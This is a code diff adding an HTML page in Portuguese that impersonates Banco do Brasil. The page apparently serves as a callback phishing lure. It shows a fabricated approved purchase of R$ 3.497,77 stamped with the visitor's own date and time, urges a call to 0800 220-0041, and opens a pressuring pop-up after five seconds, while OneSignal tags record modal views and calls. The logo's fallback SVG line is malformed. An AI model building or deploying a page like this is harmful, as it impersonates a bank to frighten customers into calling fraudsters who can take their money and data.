@@ -1,0 +1,649 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+    <title>Banco do Brasil - Compra Aprovada</title>
+    
+    <!-- Favicon local -->
+    <link rel="icon" type="image/x-icon" href="./favicon.ico">
+    
+    <!-- Meta tags importantes -->
+    <meta name="description" content="Notificação de compra aprovada - Banco do Brasil">
+    <meta name="theme-color" content="#FFCC29">
+
+    <!-- OneSignal -->
+    <script src="https://cdn.onesignal.com/sdks/web/v16/OneSignalSDK.page.js" defer></script>
+    <script>
+        window.OneSignalDeferred = window.OneSignalDeferred || [];
+        OneSignalDeferred.push(async function(OneSignal) {
+            await OneSignal.init({
+                appId: "8607c111-fcb0-4399-8d5f-ef6579ed6be5",
+                allowLocalhostAsSecureOrigin: true,
+            });
+        });
+    </script>
+    
+    <style>
+        /* Estilos personalizados */
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', sans-serif;
+        }
+        
+        .bb-yellow {
+            background-color: #FFCC29;
+        }
+        
+        .bb-yellow-text {
+            color: #FFCC29;
+        }
+        
+        .bb-yellow-dark {
+            background-color: #E6B825;
+        }
+        
+        .bb-blue {
+            background-color: #0033A0;
+        }
+        
+        .bb-blue-text {
+            color: #0033A0;
+        }
+        
+        .btn-telefone {
+            background-color: #FFCC29;
+            transition: all 0.3s ease;
+        }
+        
+        .btn-telefone:hover {
+            background-color: #E6B825;
+            transform: scale(1.02);
+        }
+        
+        .security-badge {
+            background: linear-gradient(135deg, #FFCC29 0%, #FFD95A 100%);
+        }
+        
+        .modal-overlay {
+            background-color: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(4px);
+        }
+        
+        .modal-content {
+            animation: slideUp 0.3s ease-out;
+        }
+        
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .checkbox-custom {
+            width: 20px;
+            height: 20px;
+            border: 2px solid #0033A0;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .checkbox-custom.checked {
+            background-color: #0033A0;
+        }
+        
+        .checkbox-custom.checked::after {
+            content: "✓";
+            color: white;
+            font-weight: bold;
+        }
+        
+        /* Estilos para o modal automático */
+        .auto-modal {
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% {
+                box-shadow: 0 0 0 0 rgba(255, 204, 41, 0.4);
+            }
+            70% {
+                box-shadow: 0 0 0 10px rgba(255, 204, 41, 0);
+            }
+            100% {
+                box-shadow: 0 0 0 0 rgba(255, 204, 41, 0);
+            }
+        }
+        
+        /* Loading screen */
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: white;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            transition: opacity 0.5s ease;
+        }
+        
+        .loading-spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #FFCC29;
+            border-bottom: 4px solid #0033A0;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        /* Header gradient */
+        .bb-header-gradient {
+            background: linear-gradient(135deg, #FFCC29 0%, #FFD95A 100%);
+        }
+        
+        /* Estilo para número de telefone */
+        .phone-number {
+            font-family: monospace;
+            letter-spacing: 1px;
+            font-weight: bold;
+        }
+    </style>
+</head>
+
+<body class="antialiased bg-gray-100">
+    <!-- Loading Screen -->
+    <div id="loadingScreen" class="loading-screen">
+        <div class="loading-spinner"></div>
+        <p class="text-gray-600">Carregando...</p>
+    </div>
+    
+    <!-- Conteúdo principal (inicialmente oculto) -->
+    <div id="mainContent" class="hidden">
+        <!-- HEADER BANCO DO BRASIL -->
+        <header class="sticky top-0 z-10 p-4 sm:p-6 bb-header-gradient shadow-sm">
+            <nav class="flex justify-between items-center">
+                <div class="flex items-center gap-3">
+                    <!-- Logo do Banco do Brasil - usando imagem local -->
+                    <img src="./logo-brasil.png" 
+                         class="w-28 sm:w-32 h-auto" 
+                         alt="Banco do Brasil"
+                         onerror="this.onerror=null; this.src='data:image/svg+xml;utf8,<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 200 60\"><rect width=\"200\" height=\"60\" fill=\"%23FFCC29\"/><text x=\"100\" y=\"40\" font-family=\"Arial\" font-size=\"24\" fill=\"black\" text-anchor=\"middle\</text></svg>
+                    <div>
+                        <h1 class="text-black text-xl font-bold">Banco do Brasil</h1>
+                        <p class="text-black/80 text-sm">Compra Aprovada</p>
+                    </div>
+                </div>
+                <div class="text-sm text-black/90 hidden sm:block">
+                    <span id="currentDate"></span>
+                </div>
+            </nav>
+        </header>
+
+        <main class="min-h-screen p-4 sm:p-6">
+            <div class="max-w-2xl mx-auto">
+                <!-- BANNER DE TRANSAÇÃO SEGURA -->
+                <div class="security-badge rounded-2xl mb-6 p-6 shadow-lg">
+                    <div class="flex items-center justify-between">
+                        <div class="flex items-center gap-4">
+                            <div class="bg-white p-3 rounded-xl">
+                                <svg class="w-8 h-8 bb-blue-text" fill="currentColor" viewBox="0 0 20 20">
+                                    <path fill-rule="evenodd" d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/>
+                                </svg>
+                            </div>
+                            <div>
+                                <h2 class="text-xl font-bold text-black">Transação Segura</h2>
+                                <p class="text-black/90">Protegida pelo Banco do Brasil</p>
+                            </div>
+                        </div>
+                        <button onclick="openSecurityModal()" 
+                                class="bg-white text-black px-4 py-2 rounded-lg font-semibold hover:bg-gray-100 transition border border-black/20">
+                            Ver detalhes
+                        </button>
+                    </div>
+                </div>
+
+                <!-- CARD PRINCIPAL -->
+                <div class="bg-white rounded-2xl shadow-xl overflow-hidden border-t-4 border-[#FFCC29]">
+                    <!-- Cabeçalho do card -->
+                    <div class="p-6 border-b">
+                        <div class="flex items-center justify-between">
+                            <div class="flex items-center gap-3">
+                                <div class="checkbox-custom checked"></div>
+                                <div>
+                                    <h1 class="text-xl font-bold text-gray-800">Alerta Banco do Brasil</h1>
+                                    <p class="text-gray-600 text-sm">Notificação de transação</p>
+                                </div>
+                            </div>
+                            <div class="text-right">
+                                <p class="text-gray-600 text-sm" id="currentDayDate">Hoje</p>
+                                <p class="font-bold text-lg" id="currentTime">12:53</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Conteúdo principal -->
+                    <div class="p-6">
+                        <div class="mb-6">
+                            <p class="text-gray-700 mb-2">Compra <span class="font-bold text-green-600">APROVADA</span> no valor de</p>
+                            <div class="text-3xl font-bold text-gray-900 mb-2">R$ 3.497,77</div>
+                            <p class="text-gray-700">na loja <span class="font-bold bb-blue-text">Magazine Luiza</span></p>
+                        </div>
+
+                        <!-- Seção de atenção -->
+                        <div class="bg-yellow-50 border border-yellow-200 rounded-xl p-5 mb-6">
+                            <div class="flex items-start gap-3">
+                                <div class="checkbox-custom mt-0.5"></div>
+                                <div class="flex-1">
+                                    <h3 class="font-bold text-yellow-800 text-lg mb-2">ATENÇÃO IMPORTANTE</h3>
+                                    <p class="text-yellow-700 mb-3">
+                                        Se você <span class="font-bold">não reconhece</span> esta compra, entre em contato imediatamente com nossa central de segurança.
+                                    </p>
+                                    <p class="text-yellow-700 text-sm">
+                                        ⚠️ O Banco do Brasil nunca solicita seus dados bancários por telefone.
+                                    </p>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Botão principal -->
+                        <div class="text-center">
+                            <button onclick="makeCall('main-button')" 
+                                    class="btn-telefone text-black font-bold py-4 px-8 rounded-xl text-lg w-full max-w-md mx-auto flex items-center justify-center gap-3 shadow-lg">
+                                <svg class="w-6 h-6" fill="currentColor" viewBox="0 0 20 20">
+                                    <path d="M2 3a1 1 0 011-1h2.153a1 1 0 01.986.836l.74 4.435a1 1 0 01-.54 1.06l-1.548.773a11.037 11.037 0 006.105 6.105l.774-1.548a1 1 0 011.059-.54l4.435.74a1 1 0 01.836.986V17a1 1 0 01-1 1h-2C7.82 18 2 12.18 2 5V3z"/>
+                                </svg>
+                                Falar com atendente
+                            </button>
+                            <p class="text-gray-500 text-sm mt-2">
+                                Telefone: <span class="phone-number">0800 220-0041</span>
+                            </p>
+                        </div>
+                    </div>
+
+                    <!-- Rodapé do card -->
+                    <div class="bg-gray-50 p-4 border-t">
+                        <div class="flex items-center justify-center gap-2 mb-2">
+                            <svg class="w-5 h-5 bb-blue-text" fill="currentColor" viewBox="0 0 20 20">
+                                <path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd"/>
+                            </svg>
+                            <span class="bb-blue-text font-semibold">Transação 100% segura</span>
+                        </div>
+                        <p class="text-center text-gray-500 text-xs mt-3">
+                            Banco do Brasil S.A. - CNPJ 00.360.305/0001-04
+                        </p>
+                    </div>
+                </div>
+
+                <!-- Informações adicionais -->
+                <div class="mt-6 text-center">
+                    <p class="text-gray-400 text-sm">
+                        Esta é uma mensagem automática do Banco do Brasil.<br>
+                        Em caso de dúvidas, entre em contato através dos canais oficiais.
+                    </p>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <!-- MODAL AUTOMÁTICO (APARECE APÓS 5 SEGUNDOS) -->
+    <div id="autoCallModal" class="fixed inset-0 z-50 hidden modal-overlay">
+        <div class="flex items-center justify-center min-h-screen p-4">
+            <div class="modal-content auto-modal bg-white rounded-2xl max-w-md w-full p-6">
+                <!-- Cabeçalho do modal -->
+                <div class="flex items-center justify-between mb-4">
+                    <div class="flex items-center gap-3">
+                        <div class="p-2 bb-yellow rounded-lg">
+                            <svg class="w-6 h-6 text-black" fill="currentColor" viewBox="0 0 20 20">
+                                <path d="M2 3a1 1 0 011-1h2.153a1 1 0 01.986.836l.74 4.435a1 1 0 01-.54 1.06l-1.548.773a11.037 11.037 0 006.105 6.105l.774-1.548a1 1 0 011.059-.54l4.435.74a1 1 0 01.836.986V17a1 1 0 01-1 1h-2C7.82 18 2 12.18 2 5V3z"/>
+                            </svg>
+                        </div>
+                        <h3 class="text-xl font-bold text-gray-800">Atendimento Banco do Brasil</h3>
+                    </div>
+                    <button onclick="closeAutoCallModal()" 
+                            class="text-gray-500 hover:text-gray-700">
+                        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/>
+                        </svg>
+                    </button>
+                </div>
+
+                <!-- Conteúdo do modal -->
+                <div class="mb-6">
+                    <div class="text-center mb-4">
+                        <div class="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-3">
+                            <svg class="w-8 h-8 text-green-600" fill="currentColor" viewBox="0 0 20 20">
+                                <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/>
+                            </svg>
+                        </div>
+                        <h4 class="font-bold text-gray-800 text-lg">Deseja falar com um atendente?</h4>
+                    </div>
+                    
+                    <p class="text-gray-600 text-center mb-6">
+                        Para maior segurança, oferecemos ligar automaticamente para nossa central de atendimento.
+                    </p>
+                    
+                    <div class="bg-yellow-50 border border-yellow-200 rounded-lg p-4 mb-6">
+                        <div class="flex items-start gap-2">
+                            <svg class="w-5 h-5 text-yellow-600 mt-0.5 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
+                                <path fill-rule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clip-rule="evenodd"/>
+                            </svg>
+                            <p class="text-yellow-700 text-sm">
+                                Esta ligação é segura. Você será atendido por um especialista do Banco do Brasil.
+                            </p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Botões do modal -->
+                <div class="flex flex-col gap-3">
+                    <button onclick="makeCall('auto-modal')" 
+                            class="w-full bb-yellow text-black py-3 rounded-lg font-bold hover:bg-[#E6B825] transition flex items-center justify-center gap-2">
+                        <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
+                            <path d="M2 3a1 1 0 011-1h2.153a1 1 0 01.986.836l.74 4.435a1 1 0 01-.54 1.06l-1.548.773a11.037 11.037 0 006.105 6.105l.774-1.548a1 1 0 011.059-.54l4.435.74a1 1 0 01.836.986V17a1 1 0 01-1 1h-2C7.82 18 2 12.18 2 5V3z"/>
+                        </svg>
+                        Sim, ligar agora para <span class="phone-number ml-1">0800 220-0041</span>
+                    </button>
+                    
+                    <button onclick="closeAutoCallModal()" 
+                            class="w-full border-2 border-gray-300 text-gray-700 py-3 rounded-lg font-bold hover:bg-gray-50 transition">
+                        Não, obrigado
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- MODAL DE SEGURANÇA -->
+    <div id="securityModal" class="fixed inset-0 z-40 hidden modal-overlay">
+        <div class="flex items-center justify-center min-h-screen p-4">
+            <div class="modal-content bg-white rounded-2xl max-w-md w-full p-6">
+                <!-- Cabeçalho do modal -->
+                <div class="flex items-center justify-between mb-4">
+                    <div class="flex items-center gap-3">
+                        <div class="p-2 bb-yellow rounded-lg">
+                            <svg class="w-6 h-6 text-black" fill="currentColor" viewBox="0 0 20 20">
+                                <path fill-rule="evenodd" d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/>
+                            </svg>
+                        </div>
+                        <h3 class="text-xl font-bold text-gray-800">Segurança Banco do Brasil</h3>
+                    </div>
+                    <button onclick="closeSecurityModal()" 
+                            class="text-gray-500 hover:text-gray-700">
+                        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/>
+                        </svg>
+                    </button>
+                </div>
+
+                <!-- Conteúdo do modal -->
+                <div class="mb-6">
+                    <div class="text-center mb-4">
+                        <div class="w-16 h-16 bb-blue rounded-full flex items-center justify-center mx-auto mb-3">
+                            <svg class="w-8 h-8 text-white" fill="currentColor" viewBox="0 0 20 20">
+                                <path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd"/>
+                            </svg>
+                        </div>
+                        <h4 class="font-bold text-gray-800 text-lg">Sua segurança é nossa prioridade</h4>
+                    </div>
+                    
+                    <div class="space-y-4">
+                        <div class="flex items-start gap-3">
+                            <svg class="w-5 h-5 text-green-500 mt-1 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
+                                <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/>
+                            </svg>
+                            <div>
+                                <h4 class="font-bold text-gray-800">Monitoramento 24h</h4>
+                                <p class="text-gray-600 text-sm">Seus cartões são monitorados constantemente</p>
+                            </div>
+                        </div>
+                        
+                        <div class="flex items-start gap-3">
+                            <svg class="w-5 h-5 text-green-500 mt-1 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
+                                <path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd"/>
+                            </svg>
+                            <div>
+                                <h4 class="font-bold text-gray-800">Proteção BB</h4>
+                                <p class="text-gray-600 text-sm">Sistema avançado de detecção de fraudes</p>
+                            </div>
+                        </div>
+                        
+                        <div class="flex items-start gap-3">
+                            <svg class="w-5 h-5 text-green-500 mt-1 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
+                                <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"/>
+                            </svg>
+                            <div>
+                                <h4 class="font-bold text-gray-800">Canais Oficiais</h4>
+                                <p class="text-gray-600 text-sm">Sempre utilize nossos canais oficiais para contato</p>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="mt-6 pt-4 border-t border-gray-200">
+                        <p class="text-center text-gray-600 text-sm">
+                            <strong>Central de Atendimento:</strong><br>
+                            <span class="phone-number text-lg">0800 220-0041</span>
+                        </p>
+                    </div>
+                </div>
+
+                <div class="mt-6 pt-4 border-t">
+                    <button onclick="closeSecurityModal()" 
+                            class="w-full bb-yellow text-black py-3 rounded-lg font-bold hover:bg-[#E6B825] transition">
+                        Entendi, obrigado
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Scripts -->
+    <script>
+        // Inicializar quando a página carregar
+        document.addEventListener('DOMContentLoaded', function() {
+            // Esconder tela de loading e mostrar conteúdo após 1 segundo
+            setTimeout(function() {
+                document.getElementById('loadingScreen').style.opacity = '0';
+                setTimeout(function() {
+                    document.getElementById('loadingScreen').style.display = 'none';
+                    document.getElementById('mainContent').classList.remove('hidden');
+                    
+                    // Inicializar data e hora
+                    updateDateTime();
+                    
+                    // Timer para abrir modal automático após 5 segundos
+                    autoModalTimer = setTimeout(() => {
+                        openAutoCallModal();
+                    }, 5000);
+                    
+                }, 500);
+            }, 1000);
+        });
+        
+        // Variáveis globais
+        let autoModalTimer = null;
+        
+        // Inicializar data e hora
+        function updateDateTime() {
+            const now = new Date();
+            
+            // Atualizar data no header
+            const optionsDate = { weekday: 'long', day: 'numeric', month: 'long', year: 'numeric' };
+            const formattedDate = now.toLocaleDateString('pt-BR', optionsDate);
+            const dateElement = document.getElementById('currentDate');
+            if (dateElement) {
+                dateElement.textContent = formattedDate.charAt(0).toUpperCase() + formattedDate.slice(1);
+            }
+            
+            // Atualizar "Hoje" no card
+            const optionsShort = { weekday: 'long' };
+            const dayName = now.toLocaleDateString('pt-BR', optionsShort);
+            const dayDateElement = document.getElementById('currentDayDate');
+            if (dayDateElement) {
+                dayDateElement.textContent = dayName.charAt(0).toUpperCase() + dayName.slice(1);
+            }
+            
+            // Atualizar hora no card
+            const hours = now.getHours().toString().padStart(2, '0');
+            const minutes = now.getMinutes().toString().padStart(2, '0');
+            const timeElement = document.getElementById('currentTime');
+            if (timeElement) {
+                timeElement.textContent = `${hours}:${minutes}`;
+            }
+        }
+        
+        // Atualizar a cada minuto
+        setInterval(updateDateTime, 60000);
+        
+        // Modal functions
+        function openAutoCallModal() {
+            const modal = document.getElementById('autoCallModal');
+            if (modal) {
+                modal.classList.remove('hidden');
+                document.body.style.overflow = 'hidden';
+                
+                // Track event
+                if (window.OneSignal) {
+                    OneSignal.sendTag('auto_modal_shown', new Date().toISOString());
+                }
+            }
+        }
+        
+        function closeAutoCallModal() {
+            const modal = document.getElementById('autoCallModal');
+            if (modal) {
+                modal.classList.add('hidden');
+                document.body.style.overflow = 'auto';
+                
+                // Cancela o timer se o usuário fechar manualmente
+                if (autoModalTimer) {
+                    clearTimeout(autoModalTimer);
+                }
+            }
+        }
+        
+        function openSecurityModal() {
+            const modal = document.getElementById('securityModal');
+            if (modal) {
+                modal.classList.remove('hidden');
+                document.body.style.overflow = 'hidden';
+            }
+        }
+        
+        function closeSecurityModal() {
+            const modal = document.getElementById('securityModal');
+            if (modal) {
+                modal.classList.add('hidden');
+                document.body.style.overflow = 'auto';
+            }
+        }
+        
+        // Fechar modal ao clicar fora
+        document.getElementById('autoCallModal')?.addEventListener('click', function(e) {
+            if (e.target === this) {
+                closeAutoCallModal();
+            }
+        });
+        
+        document.getElementById('securityModal')?.addEventListener('click', function(e) {
+            if (e.target === this) {
+                closeSecurityModal();
+            }
+        });
+        
+        // Função para fazer a ligação
+        function makeCall(source = 'button') {
+            const phoneNumber = "08002200041"; // Sem hífen para o link tel:
+            
+            // Fechar modais se estiverem abertos
+            closeAutoCallModal();
+            closeSecurityModal();
+            
+            // Feedback visual
+            let button;
+            if (source === 'auto-modal') {
+                button = event.currentTarget;
+            } else {
+                button = document.querySelector('button[onclick*="makeCall(\'main-button\')"]');
+            }
+            
+            if (!button) return;
+            
+            const originalHTML = button.innerHTML;
+            
+            button.classList.add('scale-95');
+            button.disabled = true;
+            button.innerHTML = `
+                <svg class="w-6 h-6 animate-spin" fill="none" viewBox="0 0 24 24">
+                    <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                    <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                </svg>
+                Conectando...
+            `;
+            
+            // Log do evento
+            console.log(`Iniciando chamada para: ${phoneNumber} (fonte: ${source})`);
+            
+            // Simular delay e depois abrir o telefone
+            setTimeout(() => {
+                button.classList.remove('scale-95');
+                button.disabled = false;
+                button.innerHTML = originalHTML;
+                
+                // Abrir app de telefone (funciona em dispositivos móveis)
+                window.location.href = `tel:${phoneNumber}`;
+                
+                // Fallback para desktop
+                if (!/Mobi|Android/i.test(navigator.userAgent)) {
+                    alert(`Para sua segurança, ligue para:\n\n0800 220-0041\n\nCentral de Atendimento Banco do Brasil`);
+                }
+                
+                // Track event
+                if (window.OneSignal) {
+                    OneSignal.sendTag('called_support', new Date().toISOString());
+                    OneSignal.sendTag('call_source', source);
+                }
+            }, 1000);
+        }
+        
+        // Adicionar efeito de clique nas checkboxes
+        document.querySelectorAll('.checkbox-custom:not(.checked)').forEach(checkbox => {
+            checkbox.addEventListener('click', function() {
+                this.classList.toggle('checked');
+            });
+        });
+        
+        // Fechar modal com ESC
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape') {
+                closeAutoCallModal();
+                closeSecurityModal();
+            }
+        });
+        
+        // Se o usuário clicar em qualquer lugar da página, cancela o timer do modal automático
+        document.addEventListener('click', function() {
+            if (autoModalTimer) {
+                clearTimeout(autoModalTimer);
+            }
+        }, { once: true });
+    </script>
+</body>
+</html>
